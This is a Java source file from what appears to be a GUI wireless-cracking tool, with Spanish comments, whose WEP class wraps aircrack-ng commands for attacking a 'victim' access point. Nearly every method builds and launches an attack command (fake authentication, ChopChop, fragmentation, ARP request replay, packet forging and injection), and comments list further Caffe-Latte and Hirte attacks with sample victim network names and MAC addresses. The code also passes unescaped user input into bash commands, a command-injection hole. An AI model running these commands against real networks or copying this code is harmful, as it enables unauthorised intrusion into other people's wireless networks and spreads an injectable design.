package attack;

import avatarwirelesscrackingtool.Shell;
import java.io.IOException;

public class WEP {

    Shell shell = new Shell();
   

    public WEP() {
    }

    public void StartSniffinAndLoggind(String Essid,String Bssidvic,String Channel, String monitor) throws IOException {
        /*
        En la pestaña “WEP”
En la sección de “General Funtionnalities”;
El botón “Start Sniffing and Logging” ejecuta el siguiente comando:
airodump-ng –c 1 -w /root/.gerix-wifi-cracker/sniff_dump --bssid 00:1D:0F:E8:0C:CC mon0
         */
        String command="airodump-ng -c "+Channel+" -w /tmp/.AWTesting/AircrackTemporal/sniff_dump --bssid " + Bssidvic + " " + monitor;
//String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
String cmd = "gnome-terminal -x bash -c \""+command+"\"";
        shell.ExecuteCommandString(cmd);

    }

    public void PTestInjAP(String Essidvic,String Bssidvic, String monitor) throws IOException {
        /*
        El botón “Perform a test of injection AP” ejecuta el siguiente comando:
aireplay-ng -9 –a 00:1D:0F:E8:0C:CC mon0
nota: Donde 00:1D:0F:E8:0C:CC corresponde a la dirección mac del router víctima y mon0 es nuestras tarjeta wireless en modo monitor.
   
         */

        String command = "aireplay-ng -9 -e "+Essidvic+" -a " + Bssidvic + " " + monitor;
        //String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
       String cmd = "gnome-terminal -x bash -c \""+command+"\"";
        shell.ExecuteCommandString(cmd);

    }

    //#################################################################################################################
    /*
        En la sección “WEP Attack (no-client)”.
Subsección “ChopCHop attack”
El botón “Start false Access point Authentication on victim” ejecuta el siguiente comando:
aireplay-ng -1 0 –e “Ingrid” –a 00:1D:0F:E8:0C:CC –h 84:C2:DB:A0:9C:2D mon0
 nota: “Ingrid” es el nombre de la red wireless víctima, 00:1D:0F:E8:0C:CC es la dirección mac de la red wireless,
        y 84:C2:DB:A0:9C:2D es nuestra dirección mac.
        
     */
    public void CHopChop(String Essidvic, String Bssidvic, String MACmonitor, String monitor) throws IOException {
        /*
        Subsección “ChopCHop attack”
El botón “Start false Access point Authentication on victim” ejecuta el siguiente comando:
aireplay-ng -1 0 –e “Ingrid” –a 00:1D:0F:E8:0C:CC –h 84:C2:DB:A0:9C:2D mon0
 nota: “Ingrid” es el nombre de la red wireless víctima, 00:1D:0F:E8:0C:CC es la dirección mac de la red wireless,
        y 84:C2:DB:A0:9C:2D es nuestra dirección mac.
        
        
         */

        String command = "aireplay-ng -1 0 -e “" + Essidvic + "” -a " + Bssidvic + " -h " + MACmonitor + " " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    public void StartChopChopAttack(String MACmonitor, String monitor) throws IOException {

        /*
    El botón “Start the ChopChop attack” ejecuta el siguiente comando:
aireplay-ng -4 –h 84:C2:DB:A0:9C:2D mon0
//aquí se abre una terminal donde se hay que escribir la opción yes “-y”, para ejecutar el este ataque.
nota: 84:C2:DB:A0:9C:2D es nuestras dirección mac.
    
         */
        String command = "aireplay-ng -4 -h " + MACmonitor + " " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    public void CreateArpInjPacketOnAccPoint(String Bssidvic, String MACmonitor, String monitor) throws IOException {
        /*
        El botón “Create the ARP packet to be injected on the victim Access point” se ejecuta el siguiente comando:
Packetforge-ng -0 –a 00:1D:0F:E8:0C:CC –h 84:C2:DB:A0:9C:2D mon0 –l 255.255.255.255 –y /root/.gerix-wifi-cracker/*.xor –w /root/.gerix-wifi-cracker/output_FORGED
         */
        String Directory = "/tmp/.AWTesting/AircrackTemporal";

        String command = "Packetforge-ng -0 -a " + Bssidvic + " -h " + MACmonitor + " " + monitor + " -l 255.255.255.255 -y " + Directory + "/*.xor -w " + Directory + "/output_FORGED";
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);
    }

    public void InjCreateArpPacket(String monitor) throws IOException {
        /*
      El botón “Inject the created packet on victim Access point” ejecuta el siguiente comando:
aireplay-ng -2 –r /root/.gerix-wifi-cracker/output_FORGED mon0
         */
        String Directory = "/tmp/.AWTesting/AircrackTemporal";
        String command = "aireplay-ng -2 -r " + Directory + "/output_FORGED " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    //############################################################################################################

    /*
  Subseccion “Fragmentation attack”
El botón  “Associate with AP using  fake auth” ejecuta el siguiente comando:
aireplay-ng -1 0 –e “Wifi_Telsur_2283483” –a 22:E6:BA:4E:FB:3F –h 90:F6:52:CA:93:D8 mon0
El botón “Fragmentation attack” ejecuta el siguiente comando:
aireplay-ng -5 –b 22:E6:BA:4E:FB:3F –h 90:F6:52:CA:93:D8 mon0
El botón “Create the ARP packet to be injected on the victim Access point” ejecuta el siguiente comando:
packetforge-ng -0 –a 22:E6:BA:4E:FB:3F –h 90:F6:52:CA:93:D8 –k 255.255.255.255 –l 255.255.255.255 –y /root/.gerix-wifi-cracker/*.xor –w /root/.gerix-wifi-cracker/output_FORGED2
El botón “Inject the created packet on victim Access point” ejecuta el siguiente comando:
aireplay-ng -2 –r /root/.gerix-wifi-creacker/output_FORGED2 mon0
nota: Donde “wifi_Telsur_2283483” es el nombre de la red wireless víctima, 22:E6:BA:4E:FB:3F es la dirección mac de la red wireless víctima y 90:F6:52:CA:93:D8 es nuestra dirección mac.

     */
    public void AssoWhApFakeAuth(String monitor, String Essidvic, String Bssidvic, String MACmonitor) throws IOException {
        /*El botón  “Associate with AP using  fake auth” ejecuta el siguiente comando:
aireplay-ng -1 0 –e “Wifi_Telsur_2283483” –a 22:E6:BA:4E:FB:3F –h 90:F6:52:CA:93:D8 mon0
         */

        String command = "aireplay-ng -1 0 -e “" + Essidvic + "” -a " + Bssidvic + " -h " + MACmonitor + " " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    public void fragAttack(String Bssidvic, String MACmonitor, String monitor) throws IOException {
        /*
      El botón “Fragmentation attack” ejecuta el siguiente comando:
aireplay-ng -5 –b 22:E6:BA:4E:FB:3F –h 90:F6:52:CA:93:D8 mon0

         */

        String command = "aireplay-ng -5 -b " + Bssidvic + " -h " + MACmonitor + " " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    public void CreathArpPackInjVAp(String Bssidvic, String MACmonitor) throws IOException {
        /* El botón “Create the ARP packet to be injected on the victim Access point” ejecuta el siguiente comando:
packetforge-ng -0 –a 22:E6:BA:4E:FB:3F –h 90:F6:52:CA:93:D8 –k 255.255.255.255 –l 255.255.255.255 –y /root/.gerix-wifi-cracker/*.xor –w /root/.gerix-wifi-cracker/output_FORGED2
         */
String Directory = "/tmp/.AWTesting/AircrackTemporal";
String command = "packetforge-ng -0 -a " + Bssidvic + " -h " + MACmonitor + " -k 255.255.255.255 -l 255.255.255.255 -y "+Directory+"/*.xor -w "+Directory+"/output_FORGED2";
String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    public void InjectPackVictAccessPoint(String monitor) throws IOException {
        /*El botón “Inject the created packet on victim Access point” ejecuta el siguiente comando:
aireplay-ng -2 –r /root/.gerix-wifi-creacker/output_FORGED2 mon0 */
String Directory = "/tmp/.AWTesting/AircrackTemporal";
        String command = "aireplay-ng -2 -r "+Directory+"/output_FORGED2 " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);

    }
//###################################################################################################################

    /*WEP Attacks (with clients)
  
Subseccion “ARP request replay attack”
     */
    public void AsociatewithAPusingfakeauth(String Bssidvic, String Essidvic, String MACmonitor, String monitor) throws IOException {//METODO YA EXISTE
//El botón “Asociate with AP using face auth” ejecuta el siguiente comando:
/*
String cmd = "aireplay-ng -1 0 –e “Wifi_Telsur_2283483” –a 22:E6:BA:4E:FB:3F –h 90:F6:52:CA:93:D8 "+monitor;
    }
         */

        String command = "aireplay-ng -1 0 -e “" + Essidvic + "” -a " + Bssidvic + " -h " + MACmonitor + " " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);
    }

//El botón “ARP request replay” ejecuta el siguiente comando:
    public void ARPrequestreplay(String Bssidvic, String MACmonitor, String monitor) throws IOException {

        String command = "aireplay-ng -3 -b " + Bssidvic + " -h " + MACmonitor + " " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);
    }


//Subseccion “ARP reques attack”

//Sección para elegir el mínimo y máximo packet length por defecto es min=68 y max=86 

    public void Capturereplaypackets(String M,String N,String Bssidvic, String MACmonitor, String monitor) throws IOException {
//El botón “Capture reaplay packets” ejecuta el siguiente comando:

        String command = "aireplay-ng -2 -p 0841 -b " + Bssidvic + " -c FF:FF:FF:FF:FF:FF -f 1 -m "+M+" -n "+N+" -h " + MACmonitor + " " + monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
        shell.ExecuteCommandString(cmd);
//se abrirá una ventana de confirmación para usar el ataque apretamos y.
    }
//Subseccion “Fragmentation client attack”
//add victim client MAC; 
//El botón “Autoload victim clients” ingrese una direccion mac.

    public void StartClientFragmentacionAttack(String VictimClient,String monitor) throws IOException {
//El botón “Start Client Fragmentacion Attack” ejecuta el siguiente comando:

        String command = "aireplay-ng -7 -c "+VictimClient+" "+monitor;
        String cmd = "xterm -e 'bash -c \""+command+"\"; read; '";
  
        shell.ExecuteCommandString(cmd);
    }

//se abrirá una ventana de confirmación para usar el ataque apretamos y.
//WEP Attack (with clients, in Access Point and Ad-Hoc mode)

    /*Subsección “Caffe-Latte attack in Access point modo” 
//El botón “Start Caffe-Latte attack” ejecuta el comando:
airbase-ng –c 6 –e “Familia 2” –L –W 1 mon0
Subsección “Hirte attack in Access point mode” 
El botón “Start Hirte attack” ejecuta el comando: 
airbase-ng –c 6 –e “Familia 2” –N –W 1 mon0
Subsección “Hirte attack in ad-hoc mode” 
El botón “Start Hirte attack” ejecuta el comando:
airbase-ng –c 6 –e “Familia 2” –N –A –W 1 mon0

    
     */
}
